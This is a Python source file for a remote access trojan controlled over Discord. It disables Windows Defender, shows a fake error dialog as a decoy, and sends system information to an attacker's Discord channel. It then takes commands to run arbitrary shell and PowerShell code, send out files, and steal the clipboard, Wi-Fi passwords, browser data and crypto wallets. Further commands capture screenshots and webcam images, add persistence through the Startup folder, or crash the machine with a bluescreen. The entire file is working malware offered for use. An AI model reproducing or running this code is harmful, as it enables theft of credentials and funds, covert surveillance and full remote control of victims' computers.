import os, discord, subprocess, requests, ctypes, sys, zipfile
from PIL import ImageGrab, Image
import cv2
from tkinter import messagebox
from config import TOKEN, GUILD_ID, DEFENDER, ERROR
from modules.browser import run, delete_files
#from modules.keylogger import Keylogger
from modules.info import start
from modules.wifi import WifiPasswords
from pyperclip import paste


def disable_defender():
    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
    try:
        subprocess.run(["powershell", "-Command", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    except:
        pass
    
if DEFENDER:
    disable_defender()


def error():
    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
    
if ERROR:
    error()


login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()

start()
with open("system.txt", "r") as f:
    system_info = f.read()
    
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "sys - System information",
    "clipboard - Return clipboard content",
    "cd - Change directory",
    "ls - List directory",
    "cwd - Get current working directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "cmd <command> - Execute cmd command",
    "pw <command> - Execute powershell command",
    "run <file> - Run an file",
    "wifi - Return wifi passwords",
    "screenshot - Take a screenshot",
    "webcam - Get image of webcam",
    "bluescreen - Blue screen victim",
    "startup - Add to startup",
    "browser - Get browser data",
    "wallet - Get wallet information",
    "keylogger - Enable keylogger",
    "!exit - Exit session and delete all data"
])


def startup(file_path=""):
    temp = os.getenv("TEMP")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
    if file_path == "":
        file_path = sys.argv[0]
    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


async def wallets(channel):
    USER_DIR = os.path.expanduser("~")

    EXODUS_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Exodus", "exodus.wallet")
    ELECTRUM_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Electrum", "wallets")

    if os.path.exists(EXODUS_DIR):
        exodus_zip = zipfile.ZipFile("Exodus.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(EXODUS_DIR):
            for file in files:
                exodus_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), EXODUS_DIR))
        exodus_zip.close()

        try:
            with open("Exodus.zip", "rb") as wallet:
                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                await channel.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            await channel.send(embed=embed)

        delete_files(["Exodus.zip"])
    
    else:
        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
        await channel.send(embed=embed)

    if os.path.exists(ELECTRUM_DIR):
        electrum_zip = zipfile.ZipFile("Electrum.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(ELECTRUM_DIR):
            for file in files:
                electrum_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), ELECTRUM_DIR))
        electrum_zip.close()

        try:
            with open("Electrum.zip", "rb") as wallet:
                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                await channel.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            await channel.send(embed=embed)

        delete_files(["Electrum.zip"])
        

async def browsers(channel):
    run()
    zip_files = []

    dir = os.getcwd()
    for filename in os.listdir(dir):
        if filename.endswith(".zip"):
            filepath = os.path.join(dir, filename)
            with zipfile.ZipFile(filepath, "r") as zip_file:
                if len(zip_file.namelist()) != 0:
                    zip_files.append(filepath)

    for file in zip_files:
        try:
            browser_data = discord.File(file, filename=os.path.basename(file))
            await channel.send(file=browser_data)
        except:
            embed = discord.Embed(title="Error", description=f"Browser data was not found!", color=0xfafafa)
            await channel.send(embed=embed)

    delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])


@client.event
async def on_ready():
    #global channel
    
    guild = client.get_guild(int(GUILD_ID))
    channel = await guild.create_text_channel(session_id)
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
    await channel.send(embed=embed)
    delete_files(["system.txt"])
    #browsers(channel)
    
@client.event
async def on_message(message):    
    if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    elif message.content == "ping":
        msg = f"PONG, `{round(client.latency * 1000)}ms`"
        await message.reply(content=msg)

    elif message.content == "sys":
            await message.reply("Fetching data...", delete_after=.3)
            start()
            with open("system.txt", "r") as f:
                system_info = f.read()

            embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
            await message.channel.send(embed=embed)
            delete_files(["system.txt"])
    
    elif message.content == "clipboard":
            try:
                clipboard = paste()
            except:
                clipboard = "Unknown"
            if clipboard == "":
                clipboard = "null"
            elif len(clipboard) > 1500:
                with open("clipboard.txt", "w", encoding="utf-8") as f:
                    f.write(clipboard)
                clipboard_file = discord.File("clipboard.txt")
                await message.reply(file=clipboard_file)
                delete_files(["clipboard.txt"])
                return
            
            embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
            await message.reply(embed=embed)
    
    elif message.content.startswith("cd"):
        directory = message.content[3:] #.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        await message.reply(embed=embed)

    elif message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)
        
    elif message.content == "cwd":
        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
        await message.reply(embed=embed)

    elif message.content.startswith("download"):
        file = message.content[9:] #.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
            await message.reply(embed=embed)

    elif message.content.startswith("upload"):
        link = message.content[7:] #.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    elif message.content.startswith("cmd"):
        command = message.content[4:]
        output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
        error_output = output[1].decode("utf-8")
        normal_output = output[0].decode("utf-8")
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
        
        if normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
            
        if error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)
        
        
    elif message.content.startswith("pw"):
        command = message.content[4:]
        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
        error_output = output[1].decode("utf-8")
        normal_output = output[0].decode("utf-8")
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
        
        if normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
            
        if error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)

    elif message.content.startswith("run"):
        file = message.content[4:]
        if file == "":
            message.reply("Please specify a file to run!")
        try:
            output = subprocess.Popen(file, shell=True)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
            await message.reply(embed=embed)
            return
        embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
        await message.reply(embed=embed)
    
    elif message.content.startswith("startup"):
        await startup()
        await message.reply("Startup Enabled!")
        
        
    elif message.content == "bluescreen":
        await message.reply("Attempting...", delete_after=.1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Bluescreen Successful!")
        else:
            await message.reply("Bluescreen Failed!")


    elif message.content == "wifi":
        WifiPasswords().run()
        with open("wifi.txt", "r") as f:
            wifi = f.read()
        if wifi == "":
            wifi = "No wifi passwords found!"
        embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
        await message.reply(embed=embed)
        delete_files(["wifi.txt"])

    
    elif message.content == "screenshot":
        try:
            screenshot = ImageGrab.grab(all_screens=True)
        except:
            return
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    elif message.content == "webcam":
        try:
            cap = cv2.VideoCapture(0)
            x, frame = cap.read()

            img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            image = Image.fromarray(img)

            path = os.path.join(os.getenv("TEMP"), "webcam.png")
            image.save(path)
            cap.release()
        except:
            return
        webcam = discord.File(path)
        embed = discord.Embed(title="Webcam", color=0xfafafa)
        embed.set_image(url="attachment://webcam.png")
        await message.reply(embed=embed, file=webcam)
    
    elif message.content == "browser":
        await browsers(message.channel)

    elif message.content == "wallet":
        await wallets(message.channel)
    
    elif message.content == "!exit":
        await message.channel.delete()
        await client.close()

    #elif message.content == "keylogger":
    #    await message.reply("Creating new webhook for keylogger...")
    #    try:
    #        webhook = await message.channel.create_webhook(name="Keylogger").url
    #        await message.reply(f"Created webhook, using URL: {webhook}")
    #        Keylogger(webhook).run()
    #    except:
    #        return
    #    
    #    await message.reply("Keylogger enabled!")
       
       
    else:
        embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
        await message.reply(embed=embed)
    
try:
    client.run(TOKEN)
except:
    pass
